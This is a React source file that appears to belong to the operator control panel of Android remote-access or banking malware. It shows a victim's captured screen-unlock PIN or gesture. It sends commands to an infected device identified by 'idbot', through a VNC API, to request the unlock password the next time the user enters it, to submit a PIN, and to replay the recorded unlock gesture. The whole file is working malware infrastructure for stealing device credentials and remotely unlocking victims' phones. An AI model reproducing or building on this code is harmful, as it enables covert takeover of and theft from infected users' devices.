import React, { useState, useEffect, useRef } from 'react'
import SettingsContext from 'src/settings';
import NextLink from 'next/link';
import { Dialog, Box, FormControl,InputLabel, Switch, Select, MenuItem, Tooltip,ListItemAvatar, Avatar, DialogTitle, SvgIcon, DialogContent, Typography, Button, Grid, Item, Paper, List, ListItem, ListItemIcon, ListItemText} from '@mui/material';
import XCircleIcon from '@heroicons/react/24/solid/XCircleIcon';
import UserIcon from '@heroicons/react/24/solid/UserCircleIcon';
import Globe from '@heroicons/react/24/solid/GlobeEuropeAfricaIcon';
import Battery from '@heroicons/react/24/solid/Battery100Icon';
import { func } from 'prop-types';
import axios from "axios";
import $ from 'jquery';
import { Svg } from "react-svg";
import cheerio from "cheerio";

import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import { faWifi, faXmarkSquare, faMobile, faUser, faUserAltSlash, faClockRotateLeft, faCommentSlash, faKeyboard, faKey, faBug, faB, faEye, faEyeSlash, faUniversalAccess, faCommentSms, faBugSlash, faCalendarDays, faSms, faAddressBook, faMobileAndroid, faMobileScreen, faMobileAlt, faMobileAndroidAlt, faRectangleList, faArrowsRotate, faTrashCan, faPaperPlane, faLink, faTowerCell, faUnlock, faLockOpen, faPlay } from '@fortawesome/free-solid-svg-icons';
import { borderRadius } from '@mui/system';

import TextField from '@mui/material/TextField';

import Notification from '../Notification/Notification';


export default function Unlock(props) {

    const { openPopup, setOpenPopup, idbot, unlockgesture} = props;
    const [data, setdata] = useState('');

      function SendPin(pin) {
        let commandreq = {
            "id": idbot,
            "command": "unlock_pin",
            "data" : {
            "pin": pin,
            }
          };
          sendCommand(commandreq);
      }

      function SendRedo() {
        let commandreq = {
            "id": idbot,
            "command": "get_unlockpass",
            "data" : {}
          };
          sendCommand(commandreq);
    }

    const handleexecrecordedgesture = (pos) => {
      
      let newpos = Object.fromEntries(
        Object.entries(pos).map(([key, value]) => [
          key,
          {
            ...value,
            dur: 200,
            last: 100,
          },
        ]));
      
        console.log(Object.values(newpos))
    
      let commandreq = {
        "id": idbot,
        "command": "action_recorded_gesture",
        "data" : {
          "pos": Object.values(newpos),
        }
      };
      sendCommand(commandreq);
    }


      const sendCommand = (commandreq) => {
    let request = $.ajax({
      type: 'POST',
      url: SettingsContext.vncApiUrl + "/api",
      data: JSON.stringify(commandreq)
  });
  }

    const [notificationVisible, setNotificationVisible] = useState(false)
    const [Pushseverity, setPushSeverity] = useState("success")
    const [Pushtitle, setPushTitle] = useState("Success")
    const [Pushmessage, setPushMessage] = useState("success")

    const sendPush = (severity, title, message) => {
        setPushSeverity(severity)
        setPushTitle(title)
        setPushMessage(message)
        setNotificationVisible(true);
        setTimeout(() => {
          setNotificationVisible(false);
        }, 5000);
      };
    
    return (
        
        <Dialog open={openPopup} onClose={() => setOpenPopup(false)} maxWidth="md">
            <DialogContent dividers>
                    <div style={{ display: "flex", justifyContent: "space-between"}}>

                    <Box
                    bgcolor="primary.main"
                    color="primary.contrastText"
                    p={2}
                    borderRadius={1}
                    marginRight={2}
                    alignItems="center"
                    display="flex"
                    height={45}
                    width={230}
                >
                    <SvgIcon fontSize="medium">
                          <FontAwesomeIcon icon={faUnlock}/>
                        </SvgIcon>
                        <Typography ml={1} variant='h6' color="primary.contrastText" >Unlock Screen</Typography>
                        
                    </Box>

                    <Button
                        onClick={()=>{setOpenPopup(false)}}>
                        <FontAwesomeIcon icon={faXmarkSquare} size="2x"/>
                    </Button>
                    </div>
                    {unlockgesture != null && Object.keys(unlockgesture).length !== 0 && (
                    
                    <div style={{ display: 'flex', justifyContent: 'flex-start' }}>
                    <Box
                    bgcolor="primary.main" color="primary.contrastText" p={2} maxHeight={200} borderRadius={1} marginRight={2} alignItems="center" display="flex" mt={3} minHeight={60} width={220}>
                    <SvgIcon fontSize="medium">
                          <FontAwesomeIcon icon={faKey}/>
                        </SvgIcon>
                        <Typography ml={1} variant='h6' color="primary.contrastText" >Password: {JSON.parse(unlockgesture.text).join(", ")}</Typography>
                        
                    </Box>
                    <Button onClick={() => {handleexecrecordedgesture(JSON.parse(unlockgesture.gesture)["points"])}} sx={{mt: 3, width: 45, height: 60, }} variant="contained"><FontAwesomeIcon icon={faPlay} size={"3x"} /></Button>
                    </div>
                  
                  )}

                    {unlockgesture != null && Object.keys(unlockgesture).length === 0 && (
                    <Box
                    bgcolor="primary.main" color="primary.contrastText" p={2} borderRadius={1} marginRight={2} alignItems="center" display="flex" mt={2} height={45} width={300}>
                    <SvgIcon fontSize="medium">
                          <FontAwesomeIcon icon={faXmarkSquare}/>
                        </SvgIcon>
                        <Typography ml={1} variant='h6' color="primary.contrastText" >No Unlock Captured</Typography>
                        
                    </Box>
                    )}
                    
                    
                    <TextField onChange={()=> setdata(event.target.value)} sx={{mt: 3}} id="outlined-basic" label="PIN" variant="outlined" fullWidth/>

                  
                    <div style={{ display: 'flex', justifyContent: 'flex-start' }}>
                    <Button onClick={()=> {{ SendRedo(); sendPush("success","Success","You will receive the login when the client enters it next time"); }}} sx={{mt: 3, width: 150, height: 42, }} startIcon={(<SvgIcon fontSize="small"><FontAwesomeIcon icon={faLockOpen} /></SvgIcon>)}variant="contained">Get Unlock</Button>
                    <Button style={{marginLeft: 60}} onClick={()=> {if (data != '') { SendPin(data); setOpenPopup(false);  setdata(''); } else { sendPush("error","Error","You need to enter a pin before performing this action"); } }} sx={{mt: 3, width: 115, height: 42, }} startIcon={(<SvgIcon fontSize="small"><FontAwesomeIcon icon={faPaperPlane} /></SvgIcon>)}variant="contained">Send</Button>
                    </div>
            </DialogContent>
            {notificationVisible && (
                <Notification
                severity={Pushseverity}
                title={Pushtitle}
                message={Pushmessage}
                duration={5000}
                />
            )}
        </Dialog>
    )
}
